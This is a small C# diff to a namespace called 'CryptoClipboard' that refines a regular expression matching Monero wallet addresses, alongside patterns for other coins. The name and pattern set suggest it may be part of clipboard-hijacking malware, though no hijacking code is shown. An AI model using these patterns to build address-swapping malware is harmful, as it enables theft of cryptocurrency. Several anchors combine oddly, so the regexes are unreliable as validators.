@@ -39,7 +39,7 @@ namespace CryptoClipboard
     {
         public readonly static Regex btc = new Regex(@"\b(bc(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|[13][a-km-zA-HJ-NP-Z1-9]{25,35})\b");
         public readonly static Regex ethereum = new Regex(@"\b0x[a-fA-F0-9]{40}\b");
-        public readonly static Regex xmr = new Regex(@"\b^4([0-9]|[A-B])(.){93}\b");
+        public readonly static Regex xmr = new Regex(@"\b^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b");
         public readonly static Regex doge = new Regex(@"\b^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$\b");
         public readonly static Regex lte = new Regex(@"\b^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$\b");
         public readonly static Regex ripple = new Regex(@"\br[0-9a-zA-Z]{24,34}\b");
